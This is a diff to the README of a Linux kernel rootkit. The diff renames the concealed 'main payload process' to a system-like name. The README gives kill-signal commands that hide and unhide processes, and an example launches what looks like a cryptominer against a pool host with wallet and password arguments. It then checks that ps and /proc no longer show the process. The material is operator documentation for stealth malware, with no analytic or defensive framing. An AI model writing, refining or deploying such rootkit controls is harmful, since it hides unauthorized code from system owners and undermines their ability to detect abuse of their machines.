@@ -40,12 +40,12 @@ kill -35 656
 # This will unhide ALL processes with the same name as PID 656
 ```
 
-### intel_gnu_header Control
+### intelheaders_gnu Control
 ```bash
-# Make intel_gnu_header visible (even though it's auto-hidden)
+# Make intelheaders_gnu visible (even though it's auto-hidden)
 kill -22 0
 
-# Hide intel_gnu_header again
+# Hide intelheaders_gnu again
 kill -23 0
 ```
 
@@ -91,13 +91,13 @@ kill -35 656
 ## Auto-Hidden Processes
 
 The rootkit automatically hides:
-- **intel_gnu_header** - The main payload process (auto-hidden on module load)
+- **intelheaders_gnu** - The main payload process (auto-hidden on module load)
 
 ## Example Usage Scenario
 
-1. Start the intel_gnu_header process:
+1. Start the intelheaders_gnu process:
    ```bash
-   /usr/bin/intel_gnu_header -o test.com:443 -u 44fdsasdf -k --tls -p prolay &
+   /usr/bin/intelheaders_gnu -o test.com:443 -u 44fdsasdf -k --tls -p prolay &
    echo $!  # Note the PID, e.g., 1234
    ```
 
@@ -105,21 +105,21 @@ The rootkit automatically hides:
 
 3. Verify it's hidden:
    ```bash
-   ps aux | grep intel_gnu_header    # Should not show the process
+   ps aux | grep intelheaders_gnu    # Should not show the process
    ps aux | grep test.com            # Should not show the process
    ls /proc/1234                     # Should show "No such file or directory"
    ```
 
-4. **To make intel_gnu_header visible again:**
+4. **To make intelheaders_gnu visible again:**
    ```bash
    # Unhide by PID (if you know the PID)
    kill -35 1234
    
-   # Or unhide from within the intel_gnu_header process itself
+   # Or unhide from within the intelheaders_gnu process itself
    kill -35 0
    
    # Verify it's now visible
-   ps aux | grep intel_gnu_header    # Should show the process
+   ps aux | grep intelheaders_gnu    # Should show the process
    ```
 
 5. **To hide it again:**
@@ -160,7 +160,7 @@ The rootkit automatically hides:
 ## Advanced Usage
 
 You can hide processes with specific patterns:
-- Hide by executable name: `intel_gnu_header`
+- Hide by executable name: `intelheaders_gnu`
 - Hide by partial command: `test.com:443`
 - Hide by argument: `44fdsasdf`
 
